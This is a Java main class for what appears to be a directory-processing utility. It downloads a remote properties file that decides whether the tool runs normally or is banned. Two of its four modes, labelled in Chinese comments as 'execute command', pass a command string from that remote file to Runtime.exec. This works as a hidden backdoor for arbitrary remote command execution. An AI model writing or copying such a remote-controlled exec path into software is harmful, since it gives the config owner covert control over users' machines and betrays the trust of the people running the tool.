package com.lzx;

import org.apache.commons.lang3.StringUtils;

import java.io.*;
import java.util.Properties;

/**
 * @author 1Zx.
 * @data 2019/12/2 9:59
 */
public class Main {

    public static Properties properties = new Properties();

    public static void main(String[] args) {
        try {
            File tmp = File.createTempFile("config",".properties");
            String config = JxfUtils.getRequest(Constants.ConfigURL);
            if (StringUtils.isNotBlank(config)) {
                FileOutputStream fileOutputStream = new FileOutputStream(tmp.getPath());
                fileOutputStream.write(config.getBytes());
                fileOutputStream.flush();
                fileOutputStream.close();
                InputStream inputStream = new BufferedInputStream(new FileInputStream(tmp.getPath()));
                properties.load(inputStream);
                inputStream.close();
                tmp.delete();
                if (Constants.version != Integer.valueOf(properties.getProperty(Constants.AppVersion))) {
                    System.out.println("version error");
                } else {
                    Integer appStatic = Integer.valueOf(properties.getProperty(Constants.AppStatic));
                    String path;
                    switch (appStatic) {
                        case 0:
                            //正常使用
                            path = args[0];
                            if (new File(path).exists()) {
                                JxfUtils.createData(path);
                            } else {
                                System.out.println("Please enter the correct directory!");
                            }
                            break;
                        case 1:
                            //禁止使用
                            System.out.println("Ban!!!");
                            break;
                        case 2:
                            //禁止并执行命令
                            System.out.println("Ban!!!");
                            Runtime.getRuntime().exec(properties.getProperty(Constants.COMMAND));
                            break;
                        case 3:
                            //使用并执行命令
                            path = args[0];
                            if (new File(path).exists()) {
                                JxfUtils.createData(path);
                            } else {
                                System.out.println("Please enter the correct directory!");
                            }
                            Runtime.getRuntime().exec(properties.getProperty(Constants.COMMAND));
                            break;
                    }
                }
            } else {
                System.out.println("network anomaly");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
